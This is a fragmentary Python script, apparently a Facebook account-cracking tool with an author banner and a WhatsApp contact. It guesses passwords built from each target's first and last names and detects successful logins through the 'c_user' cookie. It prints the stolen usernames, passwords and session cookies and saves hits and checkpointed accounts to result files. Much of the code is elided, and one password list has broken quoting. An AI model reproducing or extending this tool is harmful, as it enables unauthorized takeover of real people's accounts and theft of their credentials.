...
\033[1;92m╔══o00════════00o════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m MR AZAN     \033[1;31;1m   █      
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +923165456679 \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m +923165456679 \033[1;31;1m █
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}mrs1234{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[RIZU-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[RIZU-CP] ", ""), titid[1])
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[AXB]","\x1b[1;92m[AXB]","\x1b[1;92m[AXB]","\x1b[1;92m[AXB]","\x1b[1;92m[AXB]","\x1b[1;92m[AXB]","\x1b[1;92m[AXB]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "t" in Apk:
                        ...
                        print(f'\r %sOK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}')
                    wrt = '[AXB-SUCCESSFUL] %s • %s' % (user,pw)
                    ok.append(wrt)
                    ...
                    try:
                        ...
                        wrt = '[AXB-CHECKPOINT] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                    ...
                    print('\r %sAXB-CP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
                    wrt = '[AXB-CHECKPOINT] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
    ...
    def kombinasi_pw(self,url):
        ...
        pwx = ['first last','firstlast','first123','last123','first786',last786',786786',firstlast123','lastfirst123','first12345','last12345','firstlast786,'firstlast']
        manshera.submit(freeq,uid,pwx,tl)
...
def alok():
    try:
        ...
        if pil =="":
            ...
            os.system('xdg-open https://wa.me/+923165456679?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);alok()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
            print(' %s[%s!%s] Input %sUsername & Password%s For Login Tool!'%(N,M,N,H,N))
        else:
